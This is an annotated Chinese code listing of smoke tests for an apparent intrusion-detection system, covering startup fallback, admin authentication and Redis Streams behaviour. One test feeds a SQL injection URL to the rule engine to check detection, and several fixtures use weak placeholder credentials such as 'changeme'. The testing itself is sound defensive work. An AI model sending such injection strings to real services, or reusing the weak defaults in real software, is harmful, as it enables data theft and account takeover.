| 604 | 注释：解释下面或当前这段代码的设计意图。 | `# 辅助：按 Redis 风格比较 stream id（形如 "ms-seq"）` |
| 605 | 注释：解释下面或当前这段代码的设计意图。 | `# ---------------------------------------------------------------------` |
| 606 | 函数定义：声明 `_compare_stream_id` 的输入、处理逻辑和返回结果。 | `def _compare_stream_id(a: str, b: str) -> int:` |
| 607 | 文档字符串：说明当前模块、类或函数的职责。 | `    """返回 -1 / 0 / 1；"0" 视为最小 id。"""` |
| 608 | 函数定义：声明 `_parse` 的输入、处理逻辑和返回结果。 | `    def _parse(x: str) -> Tuple[int, int]:` |
| 609 | 条件判断：满足条件时进入对应分支。 | `        if x in ("0", "$", ""):` |
| 610 | 返回结果：把处理后的值交回调用方。 | `            return (-1 if x == "0" else 10**18, 0)` |
| 611 | 条件判断：满足条件时进入对应分支。 | `        if "-" in x:` |
| 612 | 函数调用：执行已有函数/方法完成当前步骤。 | `            lhs, rhs = x.split("-", 1)` |
| 613 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 614 | 返回结果：把处理后的值交回调用方。 | `                return (int(lhs), int(rhs))` |
| 615 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except ValueError:` |
| 616 | 返回结果：把处理后的值交回调用方。 | `                return (-1, 0)` |
| 617 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 618 | 返回结果：把处理后的值交回调用方。 | `            return (int(x), 0)` |
| 619 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ValueError:` |
| 620 | 返回结果：把处理后的值交回调用方。 | `            return (-1, 0)` |
| 621 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 622 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ta, tb = _parse(a), _parse(b)` |
| 623 | 条件判断：满足条件时进入对应分支。 | `    if ta < tb:` |
| 624 | 返回结果：把处理后的值交回调用方。 | `        return -1` |
| 625 | 条件判断：满足条件时进入对应分支。 | `    if ta > tb:` |
| 626 | 返回结果：把处理后的值交回调用方。 | `        return 1` |
| 627 | 返回结果：把处理后的值交回调用方。 | `    return 0` |

## `tests/_phase8_smoke.py`

- 类型：测试
- 行数：248

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Phase 8 冒烟测试（扩展版）。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `运行：` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `    python -m tests._phase8_smoke` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `断言覆盖：` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S1] 主入口可正常导入` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S2] 缺少部分模型文件时系统不直接崩溃` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S3] Redis 不可用时仍能正常启动（降级到内存模式）` |
| 10 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S4] 规则引擎在 ML 未加载时仍可识别 SQL 注入` |
| 11 | 函数调用：执行已有函数/方法完成当前步骤。 | `    [S5] shutdown() 幂等可重复调用` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S6] 哈希链完整性校验通过` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S7] 管理员认证：哈希优先、明文兜底、弱密码告警` |
| 14 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S8] Redis Streams：xadd -> xreadgroup -> xack 的内存降级语义正确` |
| 15 | 代码语句：参与当前文件的业务流程或数据处理。 | `    [S9] bootstrap_models 在非交互环境下优雅退出（stdin 关闭）` |
| 16 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 17 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import io` |
| 20 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 21 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 22 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import subprocess` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 24 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import tempfile` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ROOT = Path(__file__).resolve().parent.parent` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 函数定义：声明 `_close_security_logger_handlers` 的输入、处理逻辑和返回结果。 | `def _close_security_logger_handlers() -> None:` |
| 32 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Release FileHandler locks before deleting temporary smoke directories."""` |
| 33 | 日志记录：输出运行状态、调试信息或异常线索。 | `    sec_logger = logging.getLogger("security")` |
| 34 | 循环：逐个处理集合或迭代器中的元素。 | `    for handler in list(sec_logger.handlers):` |
| 35 | 日志记录：输出运行状态、调试信息或异常线索。 | `        sec_logger.removeHandler(handler)` |
| 36 | 函数调用：执行已有函数/方法完成当前步骤。 | `        handler.close()` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 函数定义：声明 `_setup_env` 的输入、处理逻辑和返回结果。 | `def _setup_env() -> None:` |
| 40 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("SECRET_KEY", "phase8-smoke-secret")` |
| 41 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("DRY_RUN", "true")` |
| 42 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("ENABLE_PACKET_CAPTURE", "false")` |
| 43 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("ENABLE_WEB_LOG", "false")` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("ENABLE_FLASK", "false")` |
| 45 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.setdefault("ADMIN_USERNAME", "admin")` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 函数定义：声明 `test_main_integration` 的输入、处理逻辑和返回结果。 | `def test_main_integration() -> None:` |
| 49 | 文档字符串：说明当前模块、类或函数的职责。 | `    """S1~S6: 主入口集成 + 降级 + 规则引擎 + 完整性校验。"""` |
| 50 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _setup_env()` |
| 51 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, str(ROOT))` |
| 52 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    old_cwd = os.getcwd()` |
| 54 | 上下文管理：自动管理资源打开与释放。 | `    with tempfile.TemporaryDirectory(prefix="guardian-phase8-smoke-") as tmp:` |
| 55 | 注释：解释下面或当前这段代码的设计意图。 | `        # SecurityGuardian uses relative logs/model paths; chdir keeps this` |
| 56 | 注释：解释下面或当前这段代码的设计意图。 | `        # smoke independent from the repository's real security.log.` |
| 57 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.chdir(tmp)` |
| 58 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 59 | 导入对象：从指定模块引入类、函数或常量。 | `            from main import RuntimeConfig, SecurityGuardian` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            cfg = RuntimeConfig.from_env()` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            guardian = SecurityGuardian(cfg=cfg)` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("[S1] Guardian init OK (redis.mode =", guardian.redis.mode, ")")` |
| 65 | 断言：验证测试或运行时假设是否成立。 | `            assert guardian.redis.mode in {"redis", "memory"}` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            loaded = guardian.load_models()` |
| 68 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("[S2] loaded_models =", loaded, "(缺失模型不崩溃)")` |
| 69 | 断言：验证测试或运行时假设是否成立。 | `            assert isinstance(loaded, dict)` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `            guardian.process_web_log(` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "src_ip": "10.0.0.99",` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "http_method": "GET",` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "url": "/users?id=1' UNION SELECT * FROM users--",` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "status_code": 200,` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "response_size": 512,` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 79 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 80 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("[S4] 规则引擎命中 SQLi OK")` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `            guardian.shutdown()` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `            guardian.shutdown()` |
| 84 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("[S5] shutdown 幂等 OK")` |
| 85 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 86 | 日志记录：输出运行状态、调试信息或异常线索。 | `            verify = guardian.security_logger.verify_integrity()` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `            print("[S6] verify_integrity:", verify)` |
| 88 | 断言：验证测试或运行时假设是否成立。 | `            assert verify["valid"], f"完整性校验失败: {verify}"` |
| 89 | 收尾逻辑：无论是否异常都会执行清理。 | `        finally:` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _close_security_logger_handlers()` |
| 91 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.chdir(old_cwd)` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 函数定义：声明 `test_admin_auth_hashed` 的输入、处理逻辑和返回结果。 | `def test_admin_auth_hashed() -> None:` |
| 95 | 文档字符串：说明当前模块、类或函数的职责。 | `    """S7a: 配置 ADMIN_PASSWORD_HASH 时应优先匹配哈希。"""` |
| 96 | 注释：解释下面或当前这段代码的设计意图。 | `    # 每个用例前把模块 reset 掉以清除 "_plaintext_warned" 状态` |
| 97 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.modules.pop("src.utils.auth", None)` |
| 98 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.auth import hash_password, verify_admin_credentials` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 注释：解释下面或当前这段代码的设计意图。 | `    # 生成一个强密码的哈希并写入环境变量` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    strong_password = "Str0ng!Pass@2026"` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    digest = hash_password(strong_password)` |
| 103 | 断言：验证测试或运行时假设是否成立。 | `    assert digest.startswith("pbkdf2:sha256"), f"哈希算法错误: {digest}"` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    os.environ["ADMIN_USERNAME"] = "admin"` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    os.environ["ADMIN_PASSWORD_HASH"] = digest` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `    os.environ.pop("ADMIN_PASSWORD", None)` |
| 108 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 109 | 断言：验证测试或运行时假设是否成立。 | `    assert verify_admin_credentials("admin", strong_password) is True` |
| 110 | 断言：验证测试或运行时假设是否成立。 | `    assert verify_admin_credentials("admin", "wrong-password") is False` |
| 111 | 断言：验证测试或运行时假设是否成立。 | `    assert verify_admin_credentials("root", strong_password) is False` |
| 112 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("[S7a] 哈希认证 OK")` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 注释：解释下面或当前这段代码的设计意图。 | `    # 模拟配置了非法哈希的情况` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    os.environ["ADMIN_PASSWORD_HASH"] = "this-is-not-a-hash"` |
| 116 | 断言：验证测试或运行时假设是否成立。 | `    assert verify_admin_credentials("admin", strong_password) is False` |
| 117 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("[S7a2] 非法哈希一律拒绝 OK")` |
| 118 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 函数定义：声明 `test_admin_auth_plaintext_fallback` 的输入、处理逻辑和返回结果。 | `def test_admin_auth_plaintext_fallback() -> None:` |
| 121 | 文档字符串：说明当前模块、类或函数的职责。 | `    """S7b: 未配置 HASH 时走明文兜底，弱默认值应打印 CRITICAL。"""` |
| 122 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.modules.pop("src.utils.auth", None)` |
| 123 | 注释：解释下面或当前这段代码的设计意图。 | `    # 捕获日志` |
| 124 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import logging` |
| 125 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    buf = io.StringIO()` |
| 127 | 日志记录：输出运行状态、调试信息或异常线索。 | `    handler = logging.StreamHandler(buf)` |
| 128 | 日志记录：输出运行状态、调试信息或异常线索。 | `    handler.setLevel(logging.DEBUG)` |
| 129 | 日志记录：输出运行状态、调试信息或异常线索。 | `    root = logging.getLogger()` |
| 130 | 函数调用：执行已有函数/方法完成当前步骤。 | `    root.addHandler(handler)` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    previous_level = root.level` |
| 132 | 日志记录：输出运行状态、调试信息或异常线索。 | `    root.setLevel(logging.DEBUG)` |
| 133 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 134 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 135 | 导入对象：从指定模块引入类、函数或常量。 | `        from src.utils.auth import verify_admin_credentials` |
| 136 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 137 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.environ.pop("ADMIN_PASSWORD_HASH", None)` |
| 138 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        os.environ["ADMIN_PASSWORD"] = "changeme"` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        os.environ["ADMIN_USERNAME"] = "admin"` |
| 140 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 141 | 断言：验证测试或运行时假设是否成立。 | `        assert verify_admin_credentials("admin", "changeme") is True` |
| 142 | 断言：验证测试或运行时假设是否成立。 | `        assert verify_admin_credentials("admin", "wrong") is False` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        logs = buf.getvalue()` |
| 144 | 断言：验证测试或运行时假设是否成立。 | `        assert "默认弱密码" in logs or "weak" in logs.lower() or "CRITICAL" in logs, (` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"应出现弱密码告警: {logs[:500]}"` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 147 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print("[S7b] 明文兜底 + 弱密码告警 OK")` |
| 148 | 收尾逻辑：无论是否异常都会执行清理。 | `    finally:` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `        root.removeHandler(handler)` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `        root.setLevel(previous_level)` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 153 | 函数定义：声明 `test_redis_streams_memory_mode` 的输入、处理逻辑和返回结果。 | `def test_redis_streams_memory_mode() -> None:` |
| 154 | 文档字符串：说明当前模块、类或函数的职责。 | `    """S8: 验证 Redis Streams 在内存降级下的 xadd/xreadgroup/xack 语义。"""` |
| 155 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.modules.pop("src.utils.redis_client", None)` |
| 156 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.utils.redis_client import RedisClient` |
| 157 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 158 | 注释：解释下面或当前这段代码的设计意图。 | `    # 指一个必定不存在的端口，强制进入内存模式` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = RedisClient(host="127.0.0.1", port=1, password="")` |
| 160 | 断言：验证测试或运行时假设是否成立。 | `    assert client.mode == "memory", f"期望内存模式, 实际 {client.mode}"` |
| 161 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stream = "smoke:alerts"` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    group = "workers"` |
| 164 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok = client.stream_ensure_group(stream, group)` |
| 166 | 断言：验证测试或运行时假设是否成立。 | `    assert ok, "stream_ensure_group 应返回 True"` |
| 167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ids = []` |
| 169 | 循环：逐个处理集合或迭代器中的元素。 | `    for i in range(3):` |
| 170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg_id = client.stream_add(` |
| 171 | 代码语句：参与当前文件的业务流程或数据处理。 | `            stream,` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"level": "high", "seq": i, "details": f"event-{i}"},` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            maxlen=100,` |
| 174 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 175 | 断言：验证测试或运行时假设是否成立。 | `        assert msg_id, "stream_add 应返回非空 id"` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ids.append(msg_id)` |
| 177 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 178 | 断言：验证测试或运行时假设是否成立。 | `    assert client.stream_len(stream) == 3` |
| 179 | 断言：验证测试或运行时假设是否成立。 | `    assert client.stream_pending(stream, group) == 0` |
| 180 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 181 | 注释：解释下面或当前这段代码的设计意图。 | `    # consumer A 读 2 条` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    entries_a = client.stream_read_group(stream, group, "consumer-A", count=2)` |
| 183 | 断言：验证测试或运行时假设是否成立。 | `    assert len(entries_a) == 2, f"期望 2 条, 实际 {len(entries_a)}"` |
| 184 | 断言：验证测试或运行时假设是否成立。 | `    assert client.stream_pending(stream, group) == 2` |
| 185 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 186 | 注释：解释下面或当前这段代码的设计意图。 | `    # consumer B 应只能读到剩下 1 条` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    entries_b = client.stream_read_group(stream, group, "consumer-B", count=10)` |
| 188 | 断言：验证测试或运行时假设是否成立。 | `    assert len(entries_b) == 1, f"期望 1 条, 实际 {len(entries_b)}"` |
| 189 | 断言：验证测试或运行时假设是否成立。 | `    assert client.stream_pending(stream, group) == 3` |
| 190 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 191 | 注释：解释下面或当前这段代码的设计意图。 | `    # ack 其中 1 条` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    acked = client.stream_ack(stream, group, [entries_a[0][0]])` |
| 193 | 断言：验证测试或运行时假设是否成立。 | `    assert acked == 1` |
| 194 | 断言：验证测试或运行时假设是否成立。 | `    assert client.stream_pending(stream, group) == 2` |
| 195 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 196 | 注释：解释下面或当前这段代码的设计意图。 | `    # 字段应保留 JSON 反序列化` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    first_fields = entries_a[0][1]` |
| 198 | 断言：验证测试或运行时假设是否成立。 | `    assert first_fields["level"] == "high"` |
| 199 | 断言：验证测试或运行时假设是否成立。 | `    assert isinstance(first_fields["seq"], int)` |
| 200 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 201 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("[S8] Redis Streams 内存降级语义 OK")` |
| 202 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 203 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 204 | 函数定义：声明 `test_bootstrap_models_non_interactive` 的输入、处理逻辑和返回结果。 | `def test_bootstrap_models_non_interactive() -> None:` |
| 205 | 文档字符串：说明当前模块、类或函数的职责。 | `    """S9: bootstrap_models 在非交互环境 (--check) 下应能正确退出。"""` |
| 206 | 注释：解释下面或当前这段代码的设计意图。 | `    # 使用 --check 避免触发真实训练` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    proc = subprocess.run(` |
| 208 | 函数调用：执行已有函数/方法完成当前步骤。 | `        [sys.executable, str(ROOT / "scripts" / "bootstrap_models.py"), "--check"],` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        capture_output=True,` |
| 210 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        text=True,` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        timeout=30,` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cwd=str(ROOT),` |
| 213 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 214 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("[S9] bootstrap_models --check returncode =", proc.returncode)` |
| 215 | 断言：验证测试或运行时假设是否成立。 | `    assert proc.returncode in (0, 2), (` |
| 216 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        f"--check 只应返回 0(齐全) 或 2(缺失): {proc.returncode}"` |
| 217 | 代码语句：参与当前文件的业务流程或数据处理。 | `        f"\nstdout=\n{proc.stdout}\nstderr=\n{proc.stderr}"` |
| 218 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 219 | 断言：验证测试或运行时假设是否成立。 | `    assert "ETAT" in proc.stdout or "READY" in proc.stdout or "MISSING" in proc.stdout, (` |
| 220 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "应打印模型状态表"` |
| 221 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 222 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 223 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 224 | 函数定义：声明 `main` 的输入、处理逻辑和返回结果。 | `def main() -> int:` |
| 225 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("=" * 60)` |
| 226 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("Phase 8 冒烟测试（扩展版）")` |
| 227 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("=" * 60)` |
| 228 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 229 | 函数调用：执行已有函数/方法完成当前步骤。 | `        test_main_integration()` |
| 230 | 函数调用：执行已有函数/方法完成当前步骤。 | `        test_admin_auth_hashed()` |
| 231 | 函数调用：执行已有函数/方法完成当前步骤。 | `        test_admin_auth_plaintext_fallback()` |
| 232 | 函数调用：执行已有函数/方法完成当前步骤。 | `        test_redis_streams_memory_mode()` |
| 233 | 函数调用：执行已有函数/方法完成当前步骤。 | `        test_bootstrap_models_non_interactive()` |
| 234 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except AssertionError as exc:` |
| 235 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(f"\n[FAIL] {exc}")` |
| 236 | 返回结果：把处理后的值交回调用方。 | `        return 1` |
| 237 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 238 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `        import traceback` |
| 239 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 240 | 函数调用：执行已有函数/方法完成当前步骤。 | `        traceback.print_exc()` |
| 241 | 函数调用：执行已有函数/方法完成当前步骤。 | `        print(f"\n[ERROR] {exc}")` |
| 242 | 返回结果：把处理后的值交回调用方。 | `        return 2` |
| 243 | 函数调用：执行已有函数/方法完成当前步骤。 | `    print("\n[smoke] Phase 8 smoke test PASSED (all 9 checks)")` |
| 244 | 返回结果：把处理后的值交回调用方。 | `    return 0` |
| 245 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 246 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 247 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 248 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.exit(main())` |

## `tests/_smoke_phase7.py`

- 类型：测试
- 行数：103

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Phase 7 最小冒烟脚本：验证 Flask app 与核心 /api/* 路由。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `仅开发时本地手动运行，不纳入 pytest 正式套件。` |
| 4 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 5 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import tempfile` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from pathlib import Path` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ROOT = Path(__file__).resolve().parent.parent` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `SMOKE_DIR = Path(tempfile.mkdtemp(prefix="guardian-phase7-smoke-"))` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 注释：解释下面或当前这段代码的设计意图。 | `# Keep this script isolated from the developer database and real audit logs.` |
| 17 | 函数调用：执行已有函数/方法完成当前步骤。 | `os.chdir(SMOKE_DIR)` |
| 18 | 函数调用：执行已有函数/方法完成当前步骤。 | `os.environ.update(` |
| 19 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "SECRET_KEY": "phase7-smoke-secret-key-which-is-at-least-32b",` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "FLASK_ENV": "testing",` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ADMIN_USERNAME": "admin",` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ADMIN_PASSWORD": "changeme",` |
